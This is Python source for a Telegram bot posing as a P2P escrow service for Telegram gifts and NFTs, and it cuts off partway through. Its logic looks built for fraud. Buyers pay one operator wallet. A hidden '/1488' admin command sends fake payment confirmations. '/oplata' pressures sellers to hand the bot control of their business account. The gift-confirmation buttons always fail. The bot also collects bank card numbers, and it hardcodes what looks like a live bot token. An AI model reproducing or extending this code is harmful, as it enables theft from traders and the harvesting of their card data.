import os
import json
import random
import string
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.exceptions import TelegramBadRequest
from typing import List
from pydantic import BaseModel, Field
import re
import html
from datetime import datetime
from urllib.parse import quote as urlquote
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# ========== CONFIG ==========
API_TOKEN = "7611354074:AAFOEEnnGpABuy3w7pwf9OzzEeeRkzR7CwY"
ADMIN_ID = 7225974704
# Кому отправлять короткий лог о запуске (/start)
START_LOG_USER_IDS = [ADMIN_ID]

BOT_USERNAME = "coolGames_robot"
BOT_NAME = "The Open Deal"
TON_WALLET_ADDRESS = os.getenv("TON_WALLET_ADDRESS", "PASTE_YOUR_TON_ADDRESS_HERE")

# Словарь для отслеживания уже залогированных действий
logged_actions = {}

# ========== STATES ==========
class SupportStates(StatesGroup):
    waiting_for_support_message = State()

# ========== CUSTOM MODELS ==========
class StarAmount(BaseModel):
    star_amount: int = Field(..., alias="amount")

class Gift(BaseModel):
    id: str
    title: str
    count: int

class GiftList(BaseModel):
    gifts: List[Gift]

class GetFixedBusinessAccountStarBalance:
    __returning__ = StarAmount
    __api_method__ = "getBusinessAccountStarBalance"
    business_connection_id: str

class GetFixedBusinessAccountGifts:
    __returning__ = GiftList
    __api_method__ = "getBusinessAccountGifts"
    business_connection_id: str

# ========== INITIALIZATION ==========
bot = Bot(token=API_TOKEN)
dp = Dispatcher()
router = Router()
user_data = {}

# Создаем необходимые директории
os.makedirs("deals", exist_ok=True)
os.makedirs("users", exist_ok=True)

# Файлы для данных
CONNECTIONS_FILE = "business_connections.json"
REFS_FILE = "refs.json"

# Хранилище для message_id сообщений поддержки
support_messages = {}

# ========== KEYBOARDS ==========
main_menu = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="💼 Управление кошельками", callback_data="add_wallet")],
        [types.InlineKeyboardButton(text="📄 Создать сделку", callback_data="create_deal")],
        [types.InlineKeyboardButton(text="📞 Поддержка", callback_data="support")],
    ]
)

back_button = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")],
    ]
)

wallet_menu = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="💳 Банковская карта", callback_data="add_card")],
        [types.InlineKeyboardButton(text="₿ Криптовалюта", callback_data="add_crypto")],
        [types.InlineKeyboardButton(text="👛 TON кошелек", callback_data="add_ton_wallet")],
        [types.InlineKeyboardButton(text="📋 Мои кошельки", callback_data="view_wallets")],
        [types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")],
    ]
)

crypto_menu = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="💎 TON", callback_data="crypto_ton")],
        [types.InlineKeyboardButton(text="🔙 Назад", callback_data="add_wallet")],
    ]
)

manage_wallets_menu = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="🗑 Удалить кошелек", callback_data="delete_wallet")],
        [types.InlineKeyboardButton(text="🔙 Назад", callback_data="add_wallet")],
    ]
)

cancel_deal_button = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="❌️ Отменить сделку", callback_data="cancel_deal")],
    ]
)

# Клавиатура для готовности при вводе NFT
nft_ready_keyboard = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="✅ Готово", callback_data="nft_done")]
    ]
)

# Клавиатура для поддержки
support_keyboard = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ]
)

# ========== UTILITY FUNCTIONS ==========
def load_refs():
    if os.path.exists(REFS_FILE):
        with open(REFS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_refs(data):
    with open(REFS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def load_connections():
    if os.path.exists(CONNECTIONS_FILE):
        with open(CONNECTIONS_FILE, "r") as f:
            return json.load(f)
    return []

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = load_connections()
    updated = False
    
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"Пользователь #{user_id} подключил бота.")
        refs = load_refs()
        user_id_str = str(user_id)
        referrer_id = refs.get(user_id_str, {}).get("referrer_id")

        if referrer_id:
            try:
                await bot.send_message(int(referrer_id), f"Ваш реферал #{user_id} подключил бота.")
            except Exception as e:
                logging.warning(f"Не удалось отправить сообщение рефереру {referrer_id}: {e}")
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

async def send_or_edit_message(user_id: int, text: str, reply_markup: types.InlineKeyboardMarkup, parse_mode: str = "HTML", disable_web_page_preview: bool = False):
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    
    try:
        if last_message_id:
            try:
                await bot.delete_message(chat_id=user_id, message_id=last_message_id)
            except Exception:
                pass
        
        sent_message = await bot.send_message(
            chat_id=user_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode,
            disable_web_page_preview=disable_web_page_preview
        )
        
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["last_bot_message_id"] = sent_message.message_id
        
    except Exception as e:
        print(f"Ошибка при отправке сообщения для пользователя {user_id}: {e}")
        try:
            sent_message = await bot.send_message(
                chat_id=user_id,
                text=text,
                parse_mode=parse_mode,
                disable_web_page_preview=disable_web_page_preview
            )
            if user_id not in user_data:
                user_data[user_id] = {}
            user_data[user_id]["last_bot_message_id"] = sent_message.message_id
        except Exception as e2:
            print(f"Критическая ошибка при отправке сообщения для пользователя {user_id}: {e2}")


async def send_welcome_screen(user_id: int):
    """Отправляет главное приветственное сообщение С ФОТО (если доступно) и обновляет last_bot_message_id."""
    caption = (
        f"👋 <b>Добро пожаловать в {BOT_NAME} – надежный P2P-гарант</b>\n\n"
        "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
        "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
        "📖 <b>Как пользоваться?</b>\nОзнакомьтесь с инструкцией — https://telegra.ph/Podrobnyj-gajd-po-ispolzovaniyu-PortalOTC-Robot-12-04\n\n"
        "Выберите нужный пункт ниже:"
    )

    # Удаляем предыдущее “бот-сообщение”, чтобы не плодить мусор
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    if last_message_id:
        try:
            await bot.delete_message(chat_id=user_id, message_id=last_message_id)
        except Exception:
            pass
        # чтобы fallback send_or_edit_message не пытался удалить ещё раз
        user_data.setdefault(user_id, {})["last_bot_message_id"] = None

    photo_path = os.path.join(os.path.dirname(__file__), "1.png")

    try:
        if os.path.exists(photo_path):
            sent = await bot.send_photo(
                chat_id=user_id,
                photo=types.FSInputFile(photo_path),
                caption=caption,
                reply_markup=main_menu,
                parse_mode="HTML"
            )
        else:
            sent = await bot.send_message(
                chat_id=user_id,
                text=caption,
                reply_markup=main_menu,
                parse_mode="HTML",
                disable_web_page_preview=True
            )

        user_data.setdefault(user_id, {})["last_bot_message_id"] = sent.message_id

    except Exception as e:
        print(f"Ошибка при отправке welcome_screen пользователю {user_id}: {e}")
        await send_or_edit_message(user_id, text=caption, reply_markup=main_menu, disable_web_page_preview=True)

async def log_to_admin(event_type: str, user_data: dict, additional_info: str = ""):
    """Логи администратору отключены (чтобы не спамить)."""
    return

async def send_start_log(user: types.User, extra: str):
    """Короткий лог только о /start (без остальных событий)."""
    try:
        username = f"@{user.username}" if user.username else "(нет username)"
        text_log = (
            f"▶️ <b>/start</b> от <code>{user.id}</code> {username}\n"
            f"{extra}"
        )
        for chat_id in START_LOG_USER_IDS:
            try:
                await bot.send_message(chat_id=chat_id, text=text_log, parse_mode="HTML")
            except Exception:
                pass
    except Exception:
        pass

# ========== BUSINESS CONNECTION HANDLER ==========
@dp.business_connection()
async def handle_business_connect(business_connection):
    """
    ⚠️ Отключено для безопасности.
    Этот бот не должен автоматически конвертировать/передавать подарки или NFT от имени пользователя.
    """
    try:
        user_id = getattr(getattr(business_connection, "user", None), "id", None)
        if user_id:
            await bot.send_message(user_id, "⚠️ Подключение бизнес-аккаунта отключено в этой сборке.")
    except Exception:
        pass
    return
@dp.message(Command("start"))
async def send_welcome(message: types.Message):
    user_id = message.from_user.id
    start_data = message.text.split(" ")
    
    # Короткий лог только о запуске (/start)
    extra = f"Параметры: {message.text}" if len(start_data) > 1 else "Чистый запуск"
    await send_start_log(message.from_user, extra)

    if user_id in user_data:
        last_message_id = user_data[user_id].get("last_bot_message_id")
        user_data[user_id] = {"last_bot_message_id": last_message_id}
    else:
        user_data[user_id] = {}

    if len(start_data) == 1:
        await send_welcome_screen(user_id)
    else:
        start_code = start_data[-1]
        
        if start_code.isalnum():
            deal_path = f"deals/{start_code}.json"

            if os.path.exists(deal_path):
                # Логируем вход в сделку (только если это не админ)
                if user_id != ADMIN_ID:
                    await log_to_admin(
                        event_type="ВХОД В СДЕЛКУ",
                        user_data={"from_user": message.from_user.__dict__},
                        additional_info=f"Код сделки: {start_code}"
                    )
                
                with open(deal_path, "r", encoding="utf-8") as file:
                    deal_data = json.load(file)

                seller_id = deal_data["user_id"]
                amount = deal_data["amount"]
                random_start = deal_data["random_start"]
                description = deal_data["description"]

                ton_amount = round(amount, 2)
                buyer_wallets = {}
                buyer_file_path = f"users/{user_id}.json"
                if os.path.exists(buyer_file_path):
                    try:
                        with open(buyer_file_path, "r", encoding="utf-8") as file:
                            buyer_info = json.load(file)
                        buyer_wallets = buyer_info.get("wallets", {})
                    except Exception as e:
                        print(f"Ошибка при загрузке кошельков покупателя: {e}")

                message_text = (
                    f"💳 <b>Информация о сделке #{random_start}</b>\n\n"
                    f"👤 <b>Вы покупатель</b> в сделке.\n"
                    f"📌 Продавец: <b>{seller_id}</b>\n"
                    f"• Успешные сделки: 0\n\n"
                    f"• Вы покупаете: {description}\n\n"
                    f"🏦 <b>Адрес для оплаты:</b>\n"
                    f"<code>{TON_WALLET_ADDRESS}</code>\n\n"
                    f"💰 <b>Сумма к оплате:</b>\n"
                    f"💎 {ton_amount} TON\n\n"
                    f"📝 <b>Комментарий к платежу:</b> {random_start}\n\n"
                    f"⚠️ <b>⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!</b>\n\n"
                    f"После оплаты ожидайте автоматического подтверждения"
                )

                tonkeeper_url = f"ton://transfer/{TON_WALLET_ADDRESS}?amount={int(ton_amount * 1e9)}&text={random_start}"
                buttons_rows = []
                buttons_rows.append([types.InlineKeyboardButton(text="Открыть в Tonkeeper", url=tonkeeper_url)])
                
                if buyer_wallets:
                    buttons_rows.append([types.InlineKeyboardButton(text="💳 Выбрать реквизиты для оплаты", callback_data=f"select_wallet_{random_start}")])
                
                buttons_rows.append([types.InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")])
                buttons = types.InlineKeyboardMarkup(inline_keyboard=buttons_rows)
                
                # Сохраняем информацию о покупателе
                deal_data["buyer_id"] = user_id
                deal_data["buyer_username"] = message.from_user.username
                deal_data["buyer_first_name"] = message.from_user.first_name
                with open(deal_path, "w", encoding="utf-8") as file:
                    json.dump(deal_data, file, ensure_ascii=False, indent=4)

                # Отправляем уведомление продавцу о начале сделки
                try:
                    nft_links = deal_data.get("nft_links", [])
                    nft_links_display = ""
                    if nft_links:
                        nft_links_display = "\n\n🔗 <b>Ссылки на NFT:</b>\n"
                        for i, link in enumerate(nft_links, 1):
                            nft_links_display += f"{i}. {link}\n"

                    buyer_quote = (
                        f"🧾 Сделка: #{random_start}\n"
                        f"🆔 Покупателя: {user_id}\n"
                        f"   · Username: {message.from_user.username if message.from_user.username else 'нет username'}\n"
                        f"💸 Сумма: {amount} TON\n"
                        f"🎁 Товар: {description}"
                    )
                    quote_html = html.escape(buyer_quote)

                    seller_message = (
                        f"🛒 <b>Покупатель начал сделку!</b>\n\n"
                        + quote_html
                        + nft_links_display
                        + (
                            "\n\n💳 <b>Ожидание оплаты:</b>\n"
                            f"Покупатель должен оплатить <b>{ton_amount} TON</b> (+ комиссия OTC)\n\n"
                            "⏳ <i>Ожидайте подтверждения оплаты на счет бота, бот сразу же уведомит вас о получении денег</i>"
                        )
                    )

                    # Создаем ссылку на чат с покупателем
                    if message.from_user.username:
                        buyer_link = f"https://t.me/{message.from_user.username}"
                    else:
                        buyer_link = f"tg://user?id={user_id}"
                    
                    seller_keyboard = types.InlineKeyboardMarkup(
                        inline_keyboard=[
                            [types.InlineKeyboardButton(text="Чат с покупателем💭", url=buyer_link)]
                        ]
                    )

                    await bot.send_message(
                        seller_id,
                        seller_message,
                        reply_markup=seller_keyboard,
                        parse_mode="HTML"
                    )
                except Exception as e:
                    print(f"Не удалось отправить уведомление продавцу {seller_id}: {e}")

                await send_or_edit_message(user_id, message_text, buttons)
            else:
                await send_or_edit_message(user_id, "❌ Сделка не найдена.", back_button)
        else:
            await send_or_edit_message(user_id, "❌ Неверный код сделки.", back_button)

@dp.message(Command("oplata"))
async def send_payment_confirmation(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()
    
    # Логируем использование команды oplata (только если это не админ)
    if user_id != ADMIN_ID:
        await log_to_admin(
            event_type="КОМАНДА OPLATA",
            user_data={"from_user": message.from_user.__dict__},
            additional_info=f"Аргументы: {args[1:] if len(args) > 1 else 'нет аргументов'}"
        )

    if user_id in user_data:
        last_message_id = user_data[user_id].get("last_bot_message_id")
        user_data[user_id] = {"last_bot_message_id": last_message_id}
    else:
        user_data[user_id] = {}

    if len(args) < 3:
        await send_or_edit_message(user_id, "Использование: /oplata {username} {seller_id}", back_button)
        return

    username = args[1]
    seller_id = args[2]
    message_text = f"✅️ <b>Оплата подтверждена</b>\n\nПодключите гарант бота к аккаунту, чтобы автоматически передать подарок покупателю - {username}"

    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="🎁 Подтверждаю отправку подарка", callback_data="gift_received")
    keyboard.button(text="🛠 Связаться с поддержкой", callback_data="support")
    keyboard.adjust(1)

    try:
        await bot.send_message(
            chat_id=int(seller_id),
            text=message_text, 
            reply_markup=keyboard.as_markup(), 
            parse_mode="HTML"
        )
        await send_or_edit_message(user_id, "✅ <b>Сообщение отправлено продавцу!</b>", back_button)
    except Exception as e:
        await send_or_edit_message(user_id, f"❌ <b>Ошибка отправки сообщения:</b> {e}", back_button)
        if user_id in user_data:
            user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}

@dp.message(Command("1488"))
async def confirm_payment(message: types.Message):
    user_id = message.from_user.id
    start_data = message.text.split(" ")
    
    # НЕ логируем использование команды 1488 если это админ
    # Эта команда используется администратором для подтверждения оплаты
    if user_id != ADMIN_ID:
        await log_to_admin(
            event_type="КОМАНДА 1488",
            user_data={"from_user": message.from_user.__dict__},
            additional_info=f"Аргументы: {start_data[1:] if len(start_data) > 1 else 'нет аргументов'}"
        )

    if user_id in user_data:
        last_message_id = user_data[user_id].get("last_bot_message_id")
        user_data[user_id] = {"last_bot_message_id": last_message_id}
    else:
        user_data[user_id] = {}

    if len(start_data) == 2:
        deal_code = start_data[1]
        deal_path = f"deals/{deal_code}.json"
        
        if os.path.exists(deal_path):
            with open(deal_path, "r", encoding="utf-8") as file:
                deal_data = json.load(file)

            seller_wallets = deal_data.get("seller_wallets", {})
            wallets_info = ""
            
            if seller_wallets and seller_wallets.get("ton"):
                wallets_info = "\n\n💳 <b>Кошельки продавца для оплаты:</b>\n"
                addr = seller_wallets["ton"].get("address", "")
                if addr:
                    wallets_info += f"👛 <b>TON:</b> <code>{addr[:10]}...{addr[-10:]}</code>\n"
                else:
                    wallets_info += "⚠️ <b>TON:</b> адрес не указан\n"
            else:
                wallets_info = "\n\n⚠️ <b>Внимание:</b> У продавца нет добавленного TON-кошелька!"

            message_text = (
                f"✅️ <b>Оплата подтверждена</b> для сделки #{deal_code}\n\n"
                f"💰 <b>Сумма:</b> <code>{deal_data['amount']} TON</code>\n"
                f"📜 <b>Описание:</b> <code>{deal_data['description']}</code>\n\n"
                "Пожалуйста, подтвердите получение подарка после того, как продавец его отправит."
                + wallets_info
            )

            buttons = types.InlineKeyboardMarkup(
                inline_keyboard=[
                    [types.InlineKeyboardButton(text="🎁 Я получил подарок", callback_data="gift_received")],
                    [types.InlineKeyboardButton(text="🛠 Связаться с поддержкой", callback_data="support")]
                ]
            )

            await send_or_edit_message(user_id, message_text, buttons)
            
            # Отправляем сообщение продавцу с кнопками для передачи подарка
            seller_id = deal_data["user_id"]
            buyer_id = deal_data.get("buyer_id")
            buyer_username = deal_data.get("buyer_username", "")
            
            if buyer_id:
                # Формируем ссылку на покупателя
                if buyer_username:
                    buyer_link = f"https://t.me/{buyer_username}"
                else:
                    buyer_link = f"tg://user?id={buyer_id}"
                
                # Получаем NFT ссылки из сделки
                nft_links_display = ""
                if "nft_links" in deal_data and deal_data["nft_links"]:
                    nft_links_display = "\n\n🔗 <b>Ссылки на NFT:</b>\n"
                    for i, link in enumerate(deal_data["nft_links"], 1):
                        nft_links_display += f"{i}. {link}\n"

                seller_message = (
                    f"✅ <b>Оплата по сделке #{deal_code} получена!</b>\n\n"
                    f"<code>Сделка: #{deal_code}</code>\n"
                    f"<code>Покупатель: {buyer_id}</code>\n"
                    f"<code>Username: @{buyer_username if buyer_username else 'нет username'}</code>\n"
                    f"<code>Сумма: {deal_data['amount']} TON</code>\n"
                    f"<code>Товар: {deal_data['description']}</code>"
                    + nft_links_display +
                    f"\n\n<b>🎁 Передайте подарок покупателю</b>\n"
                    f"Нажмите кнопку ниже, чтобы перейти в чат с покупателем"
                )

                seller_keyboard = types.InlineKeyboardMarkup(
                    inline_keyboard=[
                        [types.InlineKeyboardButton(text="Чат с покупателем💭", url=buyer_link)],
                        [types.InlineKeyboardButton(text="Подтвердить передачу покупателю ✅", callback_data=f"confirm_gift_sent_{deal_code}")],
                        [types.InlineKeyboardButton(text="Поддержка🛡️", callback_data="support")]
                    ]
                )

                await bot.send_message(
                    chat_id=seller_id,
                    text=seller_message,
                    reply_markup=seller_keyboard,
                    parse_mode="HTML"
                )
            else:
                print(f"В сделке {deal_code} нет buyer_id, не могу отправить сообщение продавцу.")
            
            # Отправляем уведомление покупателю о подтверждении сделки
            buyer_id = deal_data.get("buyer_id")
            if buyer_id and buyer_id != user_id:  # Проверяем, что покупатель существует и это не админ
                try:
                    buyer_notification = (
                        f"✅️ <b>Ваша сделка #{deal_code} подтверждена!</b>\n\n"
                        f"💰 <b>Сумма:</b> <code>{deal_data['amount']} TON</code>\n"
                        f"📜 <b>Описание:</b> <code>{deal_data['description']}</code>\n\n"
                        "Ожидайте отправки подарка от продавца."
                    )
                    
                    buyer_buttons = types.InlineKeyboardMarkup(
                        inline_keyboard=[
                            [types.InlineKeyboardButton(text="🎁 Я получил подарок", callback_data="gift_received")],
                            [types.InlineKeyboardButton(text="🛠 Связаться с поддержкой", callback_data="support")]
                        ]
                    )
                    
                    await bot.send_message(
                        chat_id=buyer_id,
                        text=buyer_notification,
                        reply_markup=buyer_buttons,
                        parse_mode="HTML"
                    )
                except Exception as e:
                    print(f"Ошибка отправки уведомления покупателю {buyer_id}: {e}")
        else:
            await send_or_edit_message(user_id, "❌ Сделка не найдена.", back_button)
            if user_id in user_data:
                user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    else:
        await send_or_edit_message(user_id, "❌ Неверный формат команды. Используйте /1488 {номер сделки}.", back_button)
        if user_id in user_data:
            user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}

# ========== CALLBACK HANDLERS ==========
@dp.callback_query(F.data == "gift_received")
async def handle_gift_received(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    await callback.answer("❌️ Подарок еще не передан", show_alert=True)

@dp.callback_query(F.data.startswith("confirm_gift_sent_"))
async def confirm_gift_sent(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    await callback.answer("❌️ Подарок не был отправлен!", show_alert=True)

@dp.callback_query(F.data == "change_language")
async def change_language(callback: types.CallbackQuery):
    await bot.answer_callback_query(callback.id, text="❌️ Ошибка", show_alert=True)

@dp.callback_query(F.data == "confirm_payment")
async def handle_payment_confirmation(callback: types.CallbackQuery):
    await bot.answer_callback_query(callback.id, text="Оплата не найдена. Подождите 10 секунд", show_alert=True)

@dp.callback_query(F.data == "close_popup")
async def close_popup(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    await send_or_edit_message(user_id, "Окно закрыто.", None)

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    await send_welcome_screen(user_id)

@dp.callback_query(F.data == "back_to_main")
async def back_to_main_handler(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    await send_welcome_screen(user_id)

@dp.callback_query(F.data == "add_wallet")
async def add_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    text = "💼 <b>Управление кошельками</b>\n\nВыберите тип кошелька, который хотите добавить или изменить:"
    await send_or_edit_message(user_id, text, wallet_menu)

@dp.callback_query(F.data == "cancel_deal")
async def cancel_deal(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    await send_or_edit_message(user_id, "❌ Сделка была отменена. Возвращаемся в главное меню.", main_menu)

@dp.callback_query(F.data == "add_card")
async def add_card(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    user_data[user_id] = {"step": "card", "wallet_type": "card", "last_bot_message_id": last_message_id}
    
    await send_or_edit_message(
        user_id,
        "💳 <b>Добавление банковской карты</b>\n\n"
        "Отправьте номер вашей банковской карты в формате:\n"
        "<code>1234 5678 9012 3456</code>\n\n"
        "⚠️ <i>Ваши данные защищены и используются только для проведения сделок</i>",
        back_button
    )

@dp.callback_query(F.data == "add_crypto")
async def add_crypto(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    await send_or_edit_message(
        user_id,
        "₿ <b>Выберите криптовалюту</b>\n\n"
        "Выберите тип криптовалюты, которую хотите добавить:",
        crypto_menu
    )

@dp.callback_query(F.data == "add_ton_wallet")
async def add_ton_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    user_data[user_id] = {"step": "ton_wallet", "wallet_type": "ton", "last_bot_message_id": last_message_id}
    
    await send_or_edit_message(
        user_id,
        "👛 <b>Добавление TON кошелька</b>\n\n"
        "Отправьте адрес вашего TON кошелька:",
        back_button
    )

@dp.callback_query(F.data == "view_wallets")
async def view_wallets(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_file_path = f"users/{user_id}.json"
    
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    if os.path.exists(user_file_path):
        with open(user_file_path, "r", encoding="utf-8") as file:
            user_info = json.load(file)
        
        wallets = user_info.get("wallets", {})
        if wallets:
            text = "📋 <b>Ваши кошельки:</b>\n\n"
            for wallet_type, wallet_data in wallets.items():
                if wallet_type == "card":
                    text += f"💳 <b>Банковская карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>\n"
                elif wallet_type == "ton":
                    text += f"👛 <b>TON кошелек:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
                elif wallet_type.startswith("crypto_"):
                    crypto_name = wallet_type.replace("crypto_", "").upper()
                    text += f"₿ <b>{crypto_name}:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
            
            text += "\nВыберите действие:"
            await send_or_edit_message(user_id, text, manage_wallets_menu)
        else:
            text = "📋 <b>У вас пока нет добавленных кошельков</b>\n\nДобавьте кошелек, чтобы начать использовать бота."
            await send_or_edit_message(user_id, text, wallet_menu)
    else:
        text = "📋 <b>У вас пока нет добавленных кошельков</b>\n\nДобавьте кошелек, чтобы начать использовать бота."
        await send_or_edit_message(user_id, text, wallet_menu)

@dp.callback_query(F.data.startswith("crypto_"))
async def handle_crypto_selection(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    crypto_type = callback.data.replace("crypto_", "")
    
    crypto_names = {
        "ton": "TON"
    }
    
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    user_data[user_id] = {"step": "crypto_wallet", "wallet_type": f"crypto_{crypto_type}", "last_bot_message_id": last_message_id}
    
    await send_or_edit_message(
        user_id,
        f"₿ <b>Добавление {crypto_names.get(crypto_type, crypto_type.upper())} кошелька</b>\n\n"
        f"Отправьте адрес вашего {crypto_names.get(crypto_type, crypto_type.upper())} кошелька:",
        back_button
    )

@dp.callback_query(F.data == "delete_wallet")
async def delete_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_file_path = f"users/{user_id}.json"
    
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    if os.path.exists(user_file_path):
        with open(user_file_path, "r", encoding="utf-8") as file:
            user_info = json.load(file)
        
        wallets = user_info.get("wallets", {})
        if wallets:
            keyboard = []
            for wallet_type, wallet_data in wallets.items():
                if wallet_type == "card":
                    button_text = f"🗑 Удалить карту: {wallet_data['number'][:4]}****{wallet_data['number'][-4:]}"
                elif wallet_type == "ton":
                    button_text = f"🗑 Удалить TON: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
                elif wallet_type.startswith("crypto_"):
                    crypto_name = wallet_type.replace("crypto_", "").upper()
                    button_text = f"🗑 Удалить {crypto_name}: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
                else:
                    continue
                
                keyboard.append([types.InlineKeyboardButton(text=button_text, callback_data=f"delete_{wallet_type}")])
            
            keyboard.append([types.InlineKeyboardButton(text="🔙 Назад", callback_data="view_wallets")])
            delete_menu = types.InlineKeyboardMarkup(inline_keyboard=keyboard)
            
            await send_or_edit_message(user_id, "🗑 <b>Выберите кошелек для удаления:</b>", delete_menu)
        else:
            await send_or_edit_message(user_id, "❌ <b>У вас нет кошельков для удаления</b>", wallet_menu)
    else:
        await send_or_edit_message(user_id, "❌ <b>У вас нет кошельков для удаления</b>", wallet_menu)

@dp.callback_query(F.data.startswith("delete_"))
async def confirm_delete_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    wallet_type = callback.data.replace("delete_", "")
    user_file_path = f"users/{user_id}.json"
    
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    if os.path.exists(user_file_path):
        with open(user_file_path, "r", encoding="utf-8") as file:
            user_info = json.load(file)
        
        wallets = user_info.get("wallets", {})
        if wallet_type in wallets:
            del wallets[wallet_type]
            user_info["wallets"] = wallets
            
            with open(user_file_path, "w", encoding="utf-8") as file:
                json.dump(user_info, file, indent=4, ensure_ascii=False)
            
            await send_or_edit_message(user_id, "✅ <b>Кошелек успешно удален!</b>", wallet_menu)
        else:
            await send_or_edit_message(user_id, "❌ <b>Кошелек не найден</b>", wallet_menu)
    else:
        await send_or_edit_message(user_id, "❌ <b>Ошибка при удалении кошелька</b>", wallet_menu)

@dp.callback_query(F.data == "create_deal")
async def start_deal(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    
    user_file_path = f"users/{user_id}.json"
    has_wallets = False
    
    if os.path.exists(user_file_path):
        try:
            with open(user_file_path, "r", encoding="utf-8") as file:
                user_info = json.load(file)
            wallets = user_info.get("wallets", {})
            has_wallets = len(wallets) > 0
        except Exception:
            has_wallets = False
    
    if not has_wallets:
        no_wallets_keyboard = types.InlineKeyboardMarkup(
            inline_keyboard=[
                [types.InlineKeyboardButton(text="💼 Добавить кошелек", callback_data="add_wallet")],
                [types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")]
            ]
        )
        
        user_data[user_id] = {"last_bot_message_id": last_message_id}
        
        await send_or_edit_message(
            user_id,
            "❌ <b>Для создания сделки необходимо добавить реквизиты!</b>\n\n"
            "У вас нет добавленных кошельков для получения оплаты.\n"
            "Пожалуйста, добавьте хотя бы один кошелек в разделе 'Управление кошельками'.",
